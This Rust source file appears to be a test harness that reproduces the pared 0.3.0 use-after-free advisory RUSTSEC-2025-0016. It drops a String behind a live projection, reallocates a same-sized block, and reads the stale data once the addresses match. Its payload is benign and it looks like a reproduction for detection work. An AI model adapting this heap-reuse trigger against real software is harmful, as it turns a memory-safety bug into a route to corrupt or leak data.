//! Derived A -> free -> B adapter for RUSTSEC-2025-0016.
//!
//! pared 0.3.0 permits `Parc::project` to retain a projection into an external
//! `String`. Dropping that String leaves the projection stale. This bounded
//! adapter preserves the free-then-stale-access edge, immediately requests a
//! distinct equal-layout `Replacement`, and treats address equality as the
//! reuse oracle. The stale read is exercised only after the measured collision.

#![forbid(unsafe_code)]

use pared::sync::Parc;
use std::hint::black_box;

const VICTIM_TYPE_ID: u64 = 0x5253_4844_0000_0001;
const VICTIM_MODULE_ID: u64 = 0x5253_4844_0000_0002;
const VICTIM_ALLOC_CALLSITE: u64 = 0x5253_4844_0000_0003;
const VICTIM_RECLAIM_CALLSITE: u64 = 0x5253_4844_0000_0004;
const PAYLOAD_SIZE: usize = 64;
const PAYLOAD: &[u8] = b"Hello World!";

pub(crate) fn with_vulnerability_edge_identity<R>(
    _type_id: u64,
    _module_id: u64,
    _callsite: u64,
    f: impl FnOnce() -> R,
) -> R {
    f()
}

pub(crate) fn report_vulnerability_edge_reuse_denial() {}

struct Replacement([u8; PAYLOAD_SIZE]);

// Keep the allocation helper noinline so the compiler audit sees a distinct
// critical site with the concrete owner type used by this adapter.
#[inline(never)]
fn materialize_value(seed: &[u8; PAYLOAD_SIZE]) -> Vec<u8> {
    seed.to_vec()
}

#[inline(never)]
fn reclaim_value<T>(value: T) {
    drop(value);
}

fn main() {
    let mut seed = [b'A'; PAYLOAD_SIZE];
    seed[..PAYLOAD.len()].copy_from_slice(PAYLOAD);
    let materialize: fn(&[u8; PAYLOAD_SIZE]) -> Vec<u8> = materialize_value;
    let bytes = crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_ALLOC_CALLSITE,
        || black_box(materialize)(&seed),
    );
    let value = String::from_utf8(bytes).expect("ASCII victim payload");
    assert_eq!(value.capacity(), PAYLOAD_SIZE);

    // pared 0.3.0 accepts this projection even though it points into `value`
    // rather than the `Parc`'s unit allocation.
    let projection = Parc::new(&()).project(|_| value.as_str());
    let original_address = value.as_ptr() as usize;

    let reclaim: fn(String) = reclaim_value;
    crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_RECLAIM_CALLSITE,
        || black_box(reclaim)(value),
    );

    let replacement = Box::new(Replacement([0x42; PAYLOAD_SIZE]));
    crate::report_vulnerability_edge_reuse_denial();
    let replacement_address = (&*replacement as *const Replacement) as usize;
    eprintln!("original={original_address:#x} replacement={replacement_address:#x}");
    black_box(&replacement.0);

    if replacement_address == original_address {
        // The replacement contains valid UTF-8, so this isolates the stale
        // projection's cross-identity read at the measured collision.
        black_box(projection.as_bytes()[0]);
    }

    drop(projection);
    drop(replacement);
}
